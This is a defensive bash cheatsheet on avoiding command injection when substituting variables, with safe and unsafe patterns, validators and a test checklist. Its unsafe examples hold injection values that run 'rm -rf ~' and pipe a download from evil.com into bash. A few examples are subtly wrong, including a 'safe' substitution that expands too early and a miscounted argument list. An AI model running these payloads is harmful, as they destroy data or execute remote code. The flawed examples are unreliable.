# Security Cheatsheet: Variable Substitution

**Quick reference for secure variable substitution patterns**

---

## The Golden Rule

```bash
# ❌ NEVER concatenate variables into command strings
eval "command $VARIABLE"
sh -c "command $VARIABLE"

# ✅ ALWAYS use argument arrays with quoted expansion
ARGS=("command" "$VARIABLE")
exec "${ARGS[@]}"
```

---

## Quick Patterns

### ✅ SAFE: Direct Execution with Arguments

```bash
#!/usr/bin/env bash
PROJECT_DIR="/home/user/My Projects/nixos"

# Variables as separate arguments - NO shell interpretation
exec code "$PROJECT_DIR"
```

**Why safe**: Variables passed as separate arguments to `exec`. Shell doesn't parse contents.

---

### ✅ SAFE: Argument Array

```bash
#!/usr/bin/env bash
COMMAND="code"
PROJECT_DIR="/home/user/My Projects/nixos"

# Build array
ARGS=("$COMMAND" "$PROJECT_DIR")

# Execute array
exec "${ARGS[@]}"
```

**Why safe**: `"${ARGS[@]}"` preserves each element as separate argument. No word splitting or glob expansion.

---

### ✅ SAFE: String Replacement (Bash)

```bash
#!/usr/bin/env bash
PARAMETERS="--work-tree=$PROJECT_DIR --flag=$PROJECT_NAME"
PROJECT_DIR="/etc/nixos"
PROJECT_NAME="nixos"

# Replace variables with actual values
RESOLVED="${PARAMETERS//\$PROJECT_DIR/$PROJECT_DIR}"
RESOLVED="${RESOLVED//\$PROJECT_NAME/$PROJECT_NAME}"

# Result: "--work-tree=/etc/nixos --flag=nixos"

# Execute safely
exec command $RESOLVED  # Safe because RESOLVED contains no user input
```

**Why safe**:
- Original `PARAMETERS` is from registry (validated at build time)
- Only substituting known variables
- No shell metacharacters introduced

---

### ❌ UNSAFE: eval with Variable

```bash
#!/usr/bin/env bash
PROJECT_DIR="/tmp/normal; rm -rf ~"

# Concatenate into string
COMMAND="code $PROJECT_DIR"

# Execute with eval - VULNERABLE
eval "$COMMAND"

# Result: Executes "code /tmp/normal" THEN "rm -rf ~"
```

**Why unsafe**: `eval` interprets shell metacharacters in `$PROJECT_DIR`. Semicolon splits into two commands.

---

### ❌ UNSAFE: sh -c with Variable

```bash
#!/usr/bin/env bash
PROJECT_DIR="/tmp/test$(curl http://evil.com/payload.sh | bash)"

# Execute with sh -c - VULNERABLE
sh -c "code $PROJECT_DIR"

# Result: Downloads and executes remote payload
```

**Why unsafe**: `sh -c` creates a new shell that interprets `$()` command substitution.

---

### ❌ UNSAFE: Unquoted Variable

```bash
#!/usr/bin/env bash
PROJECT_DIR="/home/user/My Projects/nixos"

# Unquoted variable - WRONG
exec code $PROJECT_DIR

# Shell expands to: code /home/user/My Projects/nixos
# Sees 4 arguments: "code", "/home/user/My", "Projects/nixos"
```

**Why unsafe**: Word splitting on spaces. Path broken into multiple arguments.

---

## Special Characters That Break Unquoted Variables

```bash
# Space - word splitting
PROJECT_DIR="/path with spaces"
exec code $PROJECT_DIR  # ❌ Broken into multiple args

# Dollar - variable expansion
PROJECT_DIR="/path/$subdir"
exec code $PROJECT_DIR  # ❌ Expands $subdir

# Semicolon - command separator
PROJECT_DIR="/tmp; malicious"
eval "code $PROJECT_DIR"  # ❌ Runs two commands

# Pipe - command chaining
PROJECT_DIR="/tmp | curl evil"
eval "code $PROJECT_DIR"  # ❌ Pipes output to curl

# Backtick - command substitution
PROJECT_DIR="/tmp/\`malicious\`"
eval "code $PROJECT_DIR"  # ❌ Executes malicious

# Glob - filename expansion
PROJECT_DIR="/tmp/*.txt"
exec code $PROJECT_DIR  # ❌ Expands to all .txt files
```

---

## Validation Patterns

### Directory Validation

```bash
validate_directory() {
    local dir="$1"

    # Non-empty
    [[ -n "$dir" ]] || return 1

    # Absolute path
    [[ "$dir" = /* ]] || return 1

    # Exists and is directory
    [[ -d "$dir" ]] || return 1

    # No newlines (suspicious)
    [[ "$dir" != *$'\n'* ]] || return 1

    # No null bytes (invalid)
    [[ "$dir" != *$'\0'* ]] || return 1

    return 0
}
```

### Parameter Validation

```bash
validate_parameters() {
    local params="$1"

    # No command substitution
    [[ "$params" != *'$('* ]] || return 1
    [[ "$params" != *'`'* ]] || return 1

    # No command separators
    [[ ! "$params" =~ [;\|\&] ]] || return 1

    # No parameter expansion
    [[ ! "$params" =~ \$\{.*\} ]] || return 1

    return 0
}
```

---

## Desktop File Pattern

```ini
[Desktop Entry]
Name=VS Code
Type=Application

# ❌ WRONG - Direct variable in Exec
Exec=code $PROJECT_DIR

# ✅ CORRECT - Call wrapper script
Exec=/path/to/wrapper.sh vscode

Icon=vscode
Categories=Development;
```

**Why wrapper**: Desktop files are static. Variables like `$PROJECT_DIR` are dynamic (change with active project). Wrapper resolves at runtime.

---

## Wrapper Script Template

```bash
#!/usr/bin/env bash
set -euo pipefail

APP_NAME="$1"
REGISTRY_FILE="$HOME/.config/i3/application-registry.json"

# Load application definition
APP_DEF=$(jq -r --arg name "$APP_NAME" '.[] | select(.name == $name)' "$REGISTRY_FILE")
COMMAND=$(echo "$APP_DEF" | jq -r '.command')
PARAMETERS=$(echo "$APP_DEF" | jq -r '.parameters // ""')

# Get project context
PROJECT_DIR=$(i3pm project current | jq -r '.directory // ""')

# Validate directory
validate_directory "$PROJECT_DIR" || PROJECT_DIR=""

# Substitute variables (if parameters exist)
if [[ -n "$PARAMETERS" ]]; then
    PARAM_RESOLVED="${PARAMETERS//\$PROJECT_DIR/$PROJECT_DIR}"
else
    PARAM_RESOLVED=""
fi

# Build argument array
ARGS=("$COMMAND")
[[ -n "$PARAM_RESOLVED" ]] && ARGS+=("$PARAM_RESOLVED")

# Execute safely
exec "${ARGS[@]}"
```

---

## Common Mistakes

### Mistake 1: Forgetting Quotes

```bash
# ❌ WRONG
exec code $PROJECT_DIR

# ✅ CORRECT
exec code "$PROJECT_DIR"
```

### Mistake 2: Using eval Unnecessarily

```bash
# ❌ WRONG
COMMAND="code $PROJECT_DIR"
eval "$COMMAND"

# ✅ CORRECT
exec code "$PROJECT_DIR"
```

### Mistake 3: Complex String Building

```bash
# ❌ WRONG
COMMAND="$BASE_CMD $ARG1 $ARG2 $ARG3"
eval "$COMMAND"

# ✅ CORRECT
ARGS=("$BASE_CMD" "$ARG1" "$ARG2" "$ARG3")
exec "${ARGS[@]}"
```

### Mistake 4: Inline Variables in Desktop Files

```ini
# ❌ WRONG - Desktop file with inline variable
Exec=bash -c "code $PROJECT_DIR"

# ✅ CORRECT - Desktop file calls wrapper
Exec=/path/to/wrapper.sh vscode
```

---

## Testing Checklist

- [ ] Test with space in path: `/home/user/My Projects`
- [ ] Test with dollar sign: `/tmp/$dir`
- [ ] Test with quotes: `/tmp/"quoted"`
- [ ] Test with semicolon (should reject): `/tmp; rm -rf ~`
- [ ] Test with pipe (should reject): `/tmp | curl`
- [ ] Test with backtick (should reject): `/tmp/\`cmd\``
- [ ] Test with command sub (should reject): `$(malicious)`
- [ ] Test empty variable (global mode)
- [ ] Test non-existent directory (should reject)
- [ ] Test relative path (should reject): `./relative`

---

## Decision Tree

```
Need to substitute variable?
│
├─ YES → User-controlled or filesystem-derived?
│   │
│   ├─ YES (e.g., PROJECT_DIR, user input)
│   │   │
│   │   └─ Use argument array + validation
│   │       ✅ ARGS=("cmd" "$VAR"); exec "${ARGS[@]}"
│   │
│   └─ NO (e.g., static config, build-time value)
│       │
│       └─ Safe to use string replacement
│           ✅ "${TEMPLATE//\$VAR/$VALUE}"
│
└─ NO → Direct execution
    ✅ exec command args
```

---

## Key Takeaways

1. **Never trust variable contents** - Assume they contain malicious characters
2. **Always use double quotes** - Prevents word splitting and glob expansion
3. **Prefer argument arrays** - Safest way to pass variables to commands
4. **Validate before substitution** - Check paths, reject metacharacters
5. **Avoid eval and sh -c** - Creates unnecessary shell interpretation layer
6. **Log all executions** - Helps debug issues and provides audit trail

---

**When in doubt, use argument arrays with quoted expansion: `exec "${ARGS[@]}"`**
